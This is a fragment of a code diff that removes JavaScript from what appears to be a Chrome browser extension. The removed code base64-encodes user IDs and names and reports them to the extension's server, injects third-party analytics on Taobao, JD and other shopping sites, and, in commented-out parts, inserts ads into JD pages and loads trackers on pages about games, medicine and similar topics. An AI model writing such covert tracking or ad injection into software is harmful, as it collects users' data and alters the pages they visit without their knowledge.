-                    }
-                    count();
-                });
-            }   //获取用户数据
-            function postUseInfo() {
-                if (info.useId && info.useName) {
-                    var base64Post = '';
-                    $.each(info,function (v,k) {
-                        base64Post += `${Base64.encode(k)}|`
-                    });
-                    base64Post = base64Post.replace(/\|$/gi,"");
-                    chrome.extension.sendMessage({
-                        name:"universal",url:`${apiUrl}/api/usr`,data:{
-                            action:'info',
-                            data:base64Post
-                        },
-                    },function () {
-                    });
-                }
-            }   //上报用户数据
-            getUseInfo();
-        }
-    }();
-    //电商平台统计
-    !function () {
-        var cnzzArr = ['.taobao.com','.taobao.hk','.tmall.com','.tmall.hk','.jd.com','.jd.hk','.suning.com','.vip.com','.mogujie.com','.dangdang.com'];
-        var cnzzArrOK = 0;
-        $.each(cnzzArr,function (v,k) {
-            if (locHost.indexOf(k) != -1) {
-                cnzzArrOK = 1;
-                return false;
-            }
-        });
-        if (cnzzArrOK == 1) {
-            cnzzAppend();
-        }
-    }();
-    //京东插入广告
-    !function () {
-        // var jdArr = ['item.jd.com','search.jd.com'];
-        // var jdArrOK = 0;
-        // $.each(jdArr,function (v,k) {
-        //     if (locHost == k) {
-        //         jdArrOK = 1;
-        //         return false;
-        //     }
-        // });
-        // if (jdArrOK) {
-        //     function checkExposure() {
-        //         $.each($('.adNeedCheck'),function () {
-        //             isVisible(this) && ($(this).removeClass('adNeedCheck'), cnzzEvent($(this).data("name"),'曝光'))
-        //         })
-        //     }//检查需要检查曝光的带class
-        //     function isVisible(b) {
-        //         var c = $(b)[0].offsetTop,a = $(window);
-        //         return !(a.scrollTop() > c + $(b).outerHeight() || a.scrollTop() + a.height() < c)
-        //     }//检查是否在可视范围中
-        //     $(window).on('scroll',function () {
-        //         checkExposure();
-        //     });
-        //     function openWindow(full_link) {
-        //         window.open('javascript:window.name;','<script>location.replace("' + full_link + '")<\/script>');
-        //     }                        //不带refer跳转
-        //     chrome.storage.local.get(null,function (e) {
-        //         if (!e.JsonJs816) {
-        //             return
-        //         }
-        //         var data = e.JsonJs816.jdInsAD;
-        //         $("<style></style>").html(`.moguInsertAD {cursor:pointer}`).appendTo("head");
-        //         if ($("#track .track-con ul").length) {
-        //             !function () {
-        //                 var val = data.jdRight;
-        //                 var html = `<li style="float: left;" class="moguInsertAD adNeedCheck" data-url="${val.url}" data-name="${val.name}">
-        //                     <a>
-        //                         <img height="150px" width="150px" src="${val.img}">
-        //                         <p class="J-p-23170432951"></p>
-        //                     </a>
-        //                 </li>`;
-        //                 $("#track .track-con ul").prepend(html);
-        //             }();
-        //         }
-        //         if ($(".ab-goods.u-ad-wrap .mc").length) {
-        //             !function () {
-        //                 var val = data.jdLeft;
-        //                 var html2 = `<div class="moguInsertAD adNeedCheck" style="margin-bottom:20px;text-align:center" data-url="${val.url}" data-name="${val.name}">
-        //                     <img width="160px" height="214px" src="${val.img}" class="err-product">
-        //                 </div>`;
-        //                 $(".ab-goods.u-ad-wrap .mc").before(html2);
-        //             }();
-        //         }
-        //         if ($("#J_bottom-ad").length) {
-        //             !function () {
-        //                 var val = data.jdBottom;
-        //                 $("#J_bottom-ad").prepend(`<div style="margin-bottom:10px;cursor:pointer;" class="moguInsertAD adNeedCheck" data-url="${val.url}" data-name="${val.name}">
-        //                     <img style="width: 100%;" src="${val.img}">
-        //                 </div>`);
-        //             }();
-        //         }
-        //         checkExposure();
-        //         $(".moguInsertAD").on('click',function (e) {
-        //             e.stopPropagation();
-        //             e.preventDefault();
-        //             cnzzEvent($(this).data("name"),'点击');
-        //             openWindow($(this).data("url"));
-        //         })
-        //     });
-        // }
-    }();
-    //其他平台统计
-    !function () {
-        // var title = $("head>title").length ? $("head>title").html() : "";
-        // var keyOK = 0;
-        // var keyArr = ['页游','游戏','小说','新闻','医疗','药','美女'];
-        // $.each(keyArr,function (v,k) {
-        //     if (title.match(k)) {
-        //         keyOK = 1;
-        //         return false;
-        //     }
-        // });
-        // if (keyOK) {
-        //     $.getScript("https://s22.cnzz.com/z_stat.php?id=1274518173&web_id=1274518173",function () {});
-        // }
-    }()
 },100);
